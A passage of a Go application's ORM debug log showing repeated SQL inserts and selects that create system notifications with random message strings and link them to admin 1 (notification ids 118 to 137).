[0m[33m[8.282ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.637','2025-06-09 14:07:58.637',NULL,1,118) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.755ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.647','2025-06-09 14:07:58.647',NULL,'XpFZIVAGDPqxFJkdnYWG','system','2025-06-09 14:07:58.647',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.733ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 119 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.759ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.66','2025-06-09 14:07:58.66',NULL,1,119) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.257ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.667','2025-06-09 14:07:58.667',NULL,'gubGyLhYiohDQCvkwqhk','system','2025-06-09 14:07:58.667',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.560ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.802ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 120 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.569ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.676','2025-06-09 14:07:58.676',NULL,1,120) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.597ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.687','2025-06-09 14:07:58.687',NULL,'nBgXSoemnzEIJgTejzWD','system','2025-06-09 14:07:58.687',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.543ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.596ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 121 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[11.122ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.698','2025-06-09 14:07:58.698',NULL,1,121) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.362ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.706','2025-06-09 14:07:58.706',NULL,'tEXWbMpdhSWXPVpFFqbz','system','2025-06-09 14:07:58.706',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.585ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.595ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 122 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[25.278ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.721','2025-06-09 14:07:58.721',NULL,1,122) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[24.559ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.747','2025-06-09 14:07:58.747',NULL,'PuLMmSHnsUCRNvMUONox','system','2025-06-09 14:07:58.747',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.498ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.554ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 123 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[23.875ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.769','2025-06-09 14:07:58.769',NULL,1,123) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[15.054ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.792','2025-06-09 14:07:58.792',NULL,'zNkkfBpuywJGLJTGKhgp','system','2025-06-09 14:07:58.792',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.444ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.609ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 124 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[21.832ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.808','2025-06-09 14:07:58.808',NULL,1,124) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[58.619ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.829','2025-06-09 14:07:58.829',NULL,'QijxRkQRceEvyaLwHgWy','system','2025-06-09 14:07:58.829',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.500ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.498ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 125 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[46.388ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.918','2025-06-09 14:07:58.918',NULL,1,125) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[36.137ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.935','2025-06-09 14:07:58.935',NULL,'jiBIzohcOZzUbkywNGPw','system','2025-06-09 14:07:58.934',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.419ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.471ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 126 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[51.355ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.972','2025-06-09 14:07:58.972',NULL,1,126) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[27.221ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.023','2025-06-09 14:07:59.023',NULL,'pbBIqwLTyzwkNMkioRpi','system','2025-06-09 14:07:59.023',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.153ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.520ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 127 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[35.041ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.061','2025-06-09 14:07:59.061',NULL,1,127) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[42.692ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.085','2025-06-09 14:07:59.085',NULL,'vfvyzTUHTNAMVhkJycCC','system','2025-06-09 14:07:59.085',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.415ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.535ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 128 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[17.548ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.129','2025-06-09 14:07:59.129',NULL,1,128) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.558ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.145','2025-06-09 14:07:59.145',NULL,'rDvCUniZcGXViKALjGvY','system','2025-06-09 14:07:59.145',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.437ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.093ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 129 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[22.167ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.157','2025-06-09 14:07:59.157',NULL,1,129) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[16.715ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.177','2025-06-09 14:07:59.177',NULL,'NasRKiAMgrFtHKJTRaJY','system','2025-06-09 14:07:59.177',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.499ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.512ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 130 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.896ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.194','2025-06-09 14:07:59.194',NULL,1,130) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.444ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.202','2025-06-09 14:07:59.202',NULL,'LUSlkZgkBwdEIhEbJIOL','system','2025-06-09 14:07:59.202',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.180ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.518ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 131 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[11.069ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.214','2025-06-09 14:07:59.214',NULL,1,131) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.469ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.221','2025-06-09 14:07:59.221',NULL,'XRhaVWEXtavzdshrVQOv','system','2025-06-09 14:07:59.221',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 132 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.732ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.231','2025-06-09 14:07:59.231',NULL,1,132) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.001ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.24','2025-06-09 14:07:59.24',NULL,'HxPLtBOurLpiAEUhKxpz','system','2025-06-09 14:07:59.24',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.561ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.547ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 133 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.977ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.251','2025-06-09 14:07:59.251',NULL,1,133) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.999ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.259','2025-06-09 14:07:59.259',NULL,'HsyQnTEVAzZNYGPPYvNg','system','2025-06-09 14:07:59.259',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.407ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.555ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 134 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.209ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.27','2025-06-09 14:07:59.27',NULL,1,134) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.978ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.28','2025-06-09 14:07:59.28',NULL,'xIAGtzgUDSavmmxnPBVN','system','2025-06-09 14:07:59.28',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.459ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 135 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.831ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.287','2025-06-09 14:07:59.287',NULL,1,135) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.928ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.295','2025-06-09 14:07:59.295',NULL,'HcIIiERSlymKCwGuvYfX','system','2025-06-09 14:07:59.295',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.421ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.561ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 136 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.431ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.302','2025-06-09 14:07:59.302',NULL,1,136) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.818ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.308','2025-06-09 14:07:59.308',NULL,'tncTgxABNaZRHyAohKWV','system','2025-06-09 14:07:59.308',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.660ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.513ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 137 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.935ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:59.318','2025-06-09 14:07:59.318',NULL,1,137) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.101ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:59.325','2025-06-09 14:07:59.325',NULL,'pMPjqMnwYITHccZiYoxC','system','2025-06-09 14:07:59.325',false) RETURNING "id"

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.455ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:59 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
